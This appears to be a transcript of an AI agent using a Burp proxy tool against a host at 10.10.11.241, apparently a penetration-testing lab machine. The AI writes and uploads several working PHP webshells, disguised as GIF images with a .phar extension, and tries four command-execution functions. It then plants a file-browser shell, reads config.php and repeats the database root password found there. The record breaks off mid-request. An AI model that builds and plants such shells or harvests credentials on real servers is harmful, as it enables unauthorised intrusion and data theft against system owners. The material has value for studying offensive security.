**User:**

<task>
retrieve saved request 1 and attempt to get the webshell working so you can execute commands on the server and see the output in the response
</task>

---

#########################################################################################
the webshell was deleted because the box was reset, realized it needed to be re-uploaded.
#########################################################################################

---

**Assistant:**

<thinking>
The user has indicated that we need to upload the webshell again. Let's do that by sending a POST request to /upload.php with the webshell file. I'll use the same webshell code as in the original request:
</thinking>

I understand we need to upload the webshell again. Let's do that:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /upload.php HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: multipart/form-data; boundary=---------------------------12345678901234567890123456789\r\nContent-Length: 636\r\nConnection: close\r\n\r\n-----------------------------12345678901234567890123456789\r\nContent-Disposition: form-data; name=\"image\"; filename=\"webshell.phar\"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a;\r\n<?php\r\necho \"<html><body>\";\r\necho \"<h1>Web Shell</h1>\";\r\necho \"<form method='POST'>\";\r\necho \"Command: <input type='text' name='cmd' style='width:500px;'>\";\r\necho \"<input type='submit' value='Execute'>\";\r\necho \"</form>\";\r\nif(isset($_POST['cmd'])){\r\n    echo \"<pre>\";\r\n    $output = shell_exec($_POST['cmd'] . ' 2>&1');\r\n    echo htmlspecialchars($output);\r\n    echo \"</pre>\";\r\n}\r\necho \"</body></html>\";\r\n?>\r\n-----------------------------12345678901234567890123456789--",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 302 Found
Date: Thu, 08 May 2025 00:57:29 GMT
Server: Apache/2.4.55 (Ubuntu)
Location: /success.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8


<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:57:31 PM (America/New_York, UTC-4:00)

# Context Window Usage
34,386 / 200K tokens used (17%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! The upload was successful (302 redirect to /success.php). Now let's try to access the uploaded webshell. Based on the previous information, it should be in the "/uploads/" directory. Let's try to access it:
</thinking>

The upload was successful! Now let's try to access the webshell:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "GET /uploads/webshell.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nConnection: close\r\n\r\n",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:57:33 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 177
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>Web Shell</h1><form method='POST'>Command: <input type='text' name='cmd' style='width:500px;'><input type='submit' value='Execute'></form></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:57:35 PM (America/New_York, UTC-4:00)

# Context Window Usage
34,866 / 200K tokens used (17%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! We've successfully accessed the webshell. Now let's try to execute a command by sending a POST request with the 'cmd' parameter:
</thinking>

Excellent! We've successfully accessed the webshell. Now let's execute a command to test it:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /uploads/webshell.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\nConnection: close\r\n\r\ncmd=id",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:57:38 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 188
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>Web Shell</h1><form method='POST'>Command: <input type='text' name='cmd' style='width:500px;'><input type='submit' value='Execute'></form><pre></pre></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:57:39 PM (America/New_York, UTC-4:00)

# Context Window Usage
35,427 / 200K tokens used (18%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Hmm, we sent a POST request with the 'cmd=id' parameter, but we didn't get any command output in the response. The <pre></pre> tags are empty. This suggests that either:

1. The command execution is not working
2. The server has disabled the shell_exec function
3. There might be an issue with how we're sending the command

Let's try a few more things:

1. Let's try a different command like 'whoami'
2. Let's also try to use a different PHP function for command execution, like 'system' or 'exec'

Let's modify our webshell to use the 'system' function instead of 'shell_exec' and upload it again:
</thinking>

It seems the command execution isn't working properly. Let's try uploading a modified webshell that uses the 'system' function instead of 'shell_exec':

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /upload.php HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: multipart/form-data; boundary=---------------------------12345678901234567890123456789\r\nContent-Length: 628\r\nConnection: close\r\n\r\n-----------------------------12345678901234567890123456789\r\nContent-Disposition: form-data; name=\"image\"; filename=\"webshell2.phar\"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a;\r\n<?php\r\necho \"<html><body>\";\r\necho \"<h1>Web Shell</h1>\";\r\necho \"<form method='POST'>\";\r\necho \"Command: <input type='text' name='cmd' style='width:500px;'>\";\r\necho \"<input type='submit' value='Execute'>\";\r\necho \"</form>\";\r\nif(isset($_POST['cmd'])){\r\n    echo \"<pre>\";\r\n    system($_POST['cmd'] . ' 2>&1');\r\n    echo \"</pre>\";\r\n}\r\necho \"</body></html>\";\r\n?>\r\n-----------------------------12345678901234567890123456789--",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 302 Found
Date: Thu, 08 May 2025 00:57:50 GMT
Server: Apache/2.4.55 (Ubuntu)
Location: /success.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8


<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:57:52 PM (America/New_York, UTC-4:00)

# Context Window Usage
36,393 / 200K tokens used (18%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! The upload was successful. Now let's try to access the new webshell and execute a command:
</thinking>

Now let's access the new webshell and try to execute a command:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "GET /uploads/webshell2.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nConnection: close\r\n\r\n",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:57:54 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 177
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>Web Shell</h1><form method='POST'>Command: <input type='text' name='cmd' style='width:500px;'><input type='submit' value='Execute'></form></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:57:56 PM (America/New_York, UTC-4:00)

# Context Window Usage
36,846 / 200K tokens used (18%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Now let's try to execute a command using the new webshell:
</thinking>

Now let's execute a command with the new webshell:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /uploads/webshell2.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\nConnection: close\r\n\r\ncmd=id",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:57:59 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 188
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>Web Shell</h1><form method='POST'>Command: <input type='text' name='cmd' style='width:500px;'><input type='submit' value='Execute'></form><pre></pre></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:58:01 PM (America/New_York, UTC-4:00)

# Context Window Usage
37,382 / 200K tokens used (19%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
We're still not getting any command output. Let's try a few more things:

1. Let's try a different command like 'whoami'
2. Let's also try to use a different PHP function for command execution, like 'passthru' or 'exec'
3. Let's try to use backticks (`) for command execution

Let's upload a new webshell with multiple command execution methods:
</thinking>

Let's try a more comprehensive webshell with multiple command execution methods:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /upload.php HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: multipart/form-data; boundary=---------------------------12345678901234567890123456789\r\nContent-Length: 1024\r\nConnection: close\r\n\r\n-----------------------------12345678901234567890123456789\r\nContent-Disposition: form-data; name=\"image\"; filename=\"webshell3.phar\"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a;\r\n<?php\r\necho \"<html><body>\";\r\necho \"<h1>Web Shell</h1>\";\r\necho \"<form method='POST'>\";\r\necho \"Command: <input type='text' name='cmd' style='width:500px;'>\";\r\necho \"<input type='submit' value='Execute'>\";\r\necho \"</form>\";\r\n\r\nif(isset($_POST['cmd'])){\r\n    $cmd = $_POST['cmd'];\r\n    echo \"<h3>Command: \" . htmlspecialchars($cmd) . \"</h3>\";\r\n    \r\n    echo \"<h4>Method 1 (shell_exec):</h4>\";\r\n    echo \"<pre>\";\r\n    $output1 = shell_exec($cmd . ' 2>&1');\r\n    echo htmlspecialchars($output1 ?? 'No output or function disabled');\r\n    echo \"</pre>\";\r\n    \r\n    echo \"<h4>Method 2 (system):</h4>\";\r\n    echo \"<pre>\";\r\n    @system($cmd . ' 2>&1', $return_var);\r\n    echo \"Return code: $return_var\";\r\n    echo \"</pre>\";\r\n    \r\n    echo \"<h4>Method 3 (exec):</h4>\";\r\n    echo \"<pre>\";\r\n    $output3 = null;\r\n    @exec($cmd . ' 2>&1', $output3, $return_var);\r\n    echo htmlspecialchars(implode(\"\\n\", $output3) ?? 'No output or function disabled');\r\n    echo \"\\nReturn code: $return_var\";\r\n    echo \"</pre>\";\r\n    \r\n    echo \"<h4>Method 4 (passthru):</h4>\";\r\n    echo \"<pre>\";\r\n    @passthru($cmd . ' 2>&1', $return_var);\r\n    echo \"\\nReturn code: $return_var\";\r\n    echo \"</pre>\";\r\n}\r\n\r\necho \"</body></html>\";\r\n?>\r\n-----------------------------12345678901234567890123456789--",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 302 Found
Date: Thu, 08 May 2025 00:58:13 GMT
Server: Apache/2.4.55 (Ubuntu)
Location: /success.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8


<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:58:15 PM (America/New_York, UTC-4:00)

# Context Window Usage
38,682 / 200K tokens used (19%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! The upload was successful. Now let's try to access the new webshell and execute a command:
</thinking>

Now let's access our new comprehensive webshell and try to execute a command:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "GET /uploads/webshell3.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nConnection: close\r\n\r\n",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:58:18 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 177
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>Web Shell</h1><form method='POST'>Command: <input type='text' name='cmd' style='width:500px;'><input type='submit' value='Execute'></form></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:58:20 PM (America/New_York, UTC-4:00)

# Context Window Usage
39,132 / 200K tokens used (20%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Now let's try to execute a command using the new webshell:
</thinking>

Now let's execute a command with our comprehensive webshell:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /uploads/webshell3.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\nConnection: close\r\n\r\ncmd=whoami",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:58:23 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 458
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>Web Shell</h1><form method='POST'>Command: <input type='text' name='cmd' style='width:500px;'><input type='submit' value='Execute'></form><h3>Command: whoami</h3><h4>Method 1 (shell_exec):</h4><pre>No output or function disabled</pre><h4>Method 2 (system):</h4><pre>Return code: </pre><h4>Method 3 (exec):</h4><pre>No output or function disabled
Return code: </pre><h4>Method 4 (passthru):</h4><pre>
Return code: </pre></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:58:24 PM (America/New_York, UTC-4:00)

# Context Window Usage
39,673 / 200K tokens used (20%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
It looks like all the command execution functions (shell_exec, system, exec, passthru) are either disabled or not producing any output. This is common in restricted PHP environments for security reasons.

Let's try a few more approaches:

1. Let's try to use PHP's built-in functions to get information about the server
2. Let's try to use PHP's file system functions to read files

Let's upload a new webshell that uses PHP's built-in functions:
</thinking>

It looks like all the command execution functions are disabled or not producing any output. Let's try a different approach using PHP's built-in functions:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /upload.php HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: multipart/form-data; boundary=---------------------------12345678901234567890123456789\r\nContent-Length: 1024\r\nConnection: close\r\n\r\n-----------------------------12345678901234567890123456789\r\nContent-Disposition: form-data; name=\"image\"; filename=\"infoshell.phar\"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a;\r\n<?php\r\necho \"<html><body>\";\r\necho \"<h1>PHP Info Shell</h1>\";\r\n\r\n// Server information\r\necho \"<h2>Server Information</h2>\";\r\necho \"<pre>\";\r\necho \"PHP Version: \" . phpversion() . \"\\n\";\r\necho \"Server Software: \" . $_SERVER['SERVER_SOFTWARE'] . \"\\n\";\r\necho \"Server Name: \" . $_SERVER['SERVER_NAME'] . \"\\n\";\r\necho \"Document Root: \" . $_SERVER['DOCUMENT_ROOT'] . \"\\n\";\r\necho \"Current Script: \" . $_SERVER['SCRIPT_FILENAME'] . \"\\n\";\r\necho \"Server IP: \" . $_SERVER['SERVER_ADDR'] . \"\\n\";\r\necho \"Remote IP: \" . $_SERVER['REMOTE_ADDR'] . \"\\n\";\r\necho \"</pre>\";\r\n\r\n// File system operations\r\necho \"<h2>Directory Listing</h2>\";\r\necho \"<form method='POST'>\";\r\necho \"Path: <input type='text' name='path' style='width:500px;' value='/var/www/html'>\";\r\necho \"<input type='submit' value='List Files'>\";\r\necho \"</form>\";\r\n\r\nif(isset($_POST['path'])){\r\n    $path = $_POST['path'];\r\n    echo \"<h3>Listing: \" . htmlspecialchars($path) . \"</h3>\";\r\n    echo \"<pre>\";\r\n    if(is_dir($path)){\r\n        $files = scandir($path);\r\n        foreach($files as $file){\r\n            echo htmlspecialchars($file);\r\n            if(is_dir($path . '/' . $file)){\r\n                echo \"/\";\r\n            }\r\n            echo \"\\n\";\r\n        }\r\n    } else {\r\n        echo \"Not a directory or permission denied.\";\r\n    }\r\n    echo \"</pre>\";\r\n}\r\n\r\n// File reading\r\necho \"<h2>File Reader</h2>\";\r\necho \"<form method='POST'>\";\r\necho \"File: <input type='text' name='file' style='width:500px;'>\";\r\necho \"<input type='submit' value='Read File'>\";\r\necho \"</form>\";\r\n\r\nif(isset($_POST['file'])){\r\n    $file = $_POST['file'];\r\n    echo \"<h3>Reading: \" . htmlspecialchars($file) . \"</h3>\";\r\n    echo \"<pre>\";\r\n    if(file_exists($file) && is_readable($file)){\r\n        echo htmlspecialchars(file_get_contents($file));\r\n    } else {\r\n        echo \"File does not exist or is not readable.\";\r\n    }\r\n    echo \"</pre>\";\r\n}\r\n\r\necho \"</body></html>\";\r\n?>\r\n-----------------------------12345678901234567890123456789--",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 302 Found
Date: Thu, 08 May 2025 00:58:41 GMT
Server: Apache/2.4.55 (Ubuntu)
Location: /success.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8


<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:58:42 PM (America/New_York, UTC-4:00)

# Context Window Usage
41,360 / 200K tokens used (21%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! The upload was successful. Now let's try to access the new PHP info shell:
</thinking>

Now let's access our PHP info shell:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "GET /uploads/infoshell.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nConnection: close\r\n\r\n",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:58:47 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 628
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>PHP Info Shell</h1><h2>Server Information</h2><pre>PHP Version: 7.4.33
Server Software: Apache/2.4.55 (Ubuntu)
Server Name: 10.10.11.241
Document Root: /var/www/html
Current Script: /var/www/html/uploads/infoshell.phar
Server IP: 192.168.5.2
Remote IP: 10.10.14.236
</pre><h2>Directory Listing</h2><form method='POST'>Path: <input type='text' name='path' style='width:500px;' value='/var/www/html'><input type='submit' value='List Files'></form><h2>File Reader</h2><form method='POST'>File: <input type='text' name='file' style='width:500px;'><input type='submit' value='Read File'></form></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:58:48 PM (America/New_York, UTC-4:00)

# Context Window Usage
41,797 / 200K tokens used (21%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! We've successfully accessed the PHP info shell and can see some server information:

- PHP Version: 7.4.33
- Server Software: Apache/2.4.55 (Ubuntu)
- Document Root: /var/www/html
- Current Script: /var/www/html/uploads/infoshell.phar
- Server IP: 192.168.5.2
- Remote IP: 10.10.14.236

Now let's try to list the files in the document root directory:
</thinking>

Great! We've successfully accessed the PHP info shell and can see server information. Now let's list the files in the document root directory:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /uploads/infoshell.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 19\r\nConnection: close\r\n\r\npath=/var/www/html",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:58:53 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 817
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>PHP Info Shell</h1><h2>Server Information</h2><pre>PHP Version: 7.4.33
Server Software: Apache/2.4.55 (Ubuntu)
Server Name: 10.10.11.241
Document Root: /var/www/html
Current Script: /var/www/html/uploads/infoshell.phar
Server IP: 192.168.5.2
Remote IP: 10.10.14.236
</pre><h2>Directory Listing</h2><form method='POST'>Path: <input type='text' name='path' style='width:500px;' value='/var/www/html'><input type='submit' value='List Files'></form><h3>Listing: /var/www/html</h3><pre>./
../
.htaccess
config.php
css/
failed.php
fonts/
images/
index.php
js/
login.php
logout.php
register.php
success.php
upload.php
uploads/
vendor/
</pre><h2>File Reader</h2><form method='POST'>File: <input type='text' name='file' style='width:500px;'><input type='submit' value='Read File'></form></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:58:54 PM (America/New_York, UTC-4:00)

# Context Window Usage
42,628 / 200K tokens used (21%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! We've successfully listed the files in the document root directory. Let's check the config.php file, which might contain sensitive information like database credentials:
</thinking>

Now let's read the config.php file, which might contain sensitive information like database credentials:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /uploads/infoshell.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 25\r\nConnection: close\r\n\r\nfile=/var/www/html/config.php",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:58:58 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1200
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>PHP Info Shell</h1><h2>Server Information</h2><pre>PHP Version: 7.4.33
Server Software: Apache/2.4.55 (Ubuntu)
Server Name: 10.10.11.241
Document Root: /var/www/html
Current Script: /var/www/html/uploads/infoshell.phar
Server IP: 192.168.5.2
Remote IP: 10.10.14.236
</pre><h2>Directory Listing</h2><form method='POST'>Path: <input type='text' name='path' style='width:500px;' value='/var/www/html'><input type='submit' value='List Files'></form><h2>File Reader</h2><form method='POST'>File: <input type='text' name='file' style='width:500px;'><input type='submit' value='Read File'></form><h3>Reading: /var/www/html/config.php</h3><pre>&lt;?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die(&quot;ERROR: Could not connect. &quot; . mysqli_connect_error());
}
?&gt;
</pre></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:59:00 PM (America/New_York, UTC-4:00)

# Context Window Usage
43,446 / 200K tokens used (22%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! We've successfully read the config.php file and found database credentials:

- DB_SERVER: localhost
- DB_USERNAME: root
- DB_PASSWORD: my$qls3rv1c3!
- DB_NAME: hospital

Now let's try to list the files in the uploads directory to see what's there:
</thinking>

Excellent! We've found database credentials in the config.php file:
- DB_USERNAME: root
- DB_PASSWORD: my$qls3rv1c3!
- DB_NAME: hospital

Now let's list the files in the uploads directory to see what's there:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /uploads/infoshell.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\nConnection: close\r\n\r\npath=/var/www/html/uploads",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 00:59:04 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 765
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>PHP Info Shell</h1><h2>Server Information</h2><pre>PHP Version: 7.4.33
Server Software: Apache/2.4.55 (Ubuntu)
Server Name: 10.10.11.241
Document Root: /var/www/html
Current Script: /var/www/html/uploads/infoshell.phar
Server IP: 192.168.5.2
Remote IP: 10.10.14.236
</pre><h2>Directory Listing</h2><form method='POST'>Path: <input type='text' name='path' style='width:500px;' value='/var/www/html'><input type='submit' value='List Files'></form><h3>Listing: /var/www/html/uploads</h3><pre>./
../
infoshell.phar
pwnd.phar
pwned.phar
webshell.phar
webshell2.phar
webshell3.phar
</pre><h2>File Reader</h2><form method='POST'>File: <input type='text' name='file' style='width:500px;'><input type='submit' value='Read File'></form></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 1:59:05 PM (America/New_York, UTC-4:00)

# Context Window Usage
44,453 / 200K tokens used (22%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
We can see all the webshells we've uploaded in the uploads directory. Now let's try to read the .htaccess file to see if there are any restrictions that might be preventing command execution:
</thinking>

Let's check the .htaccess file to see if there are any restrictions that might be preventing command execution:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /uploads/infoshell.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 28\r\nConnection: close\r\n\r\nfile=/var/www/html/.htaccess",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
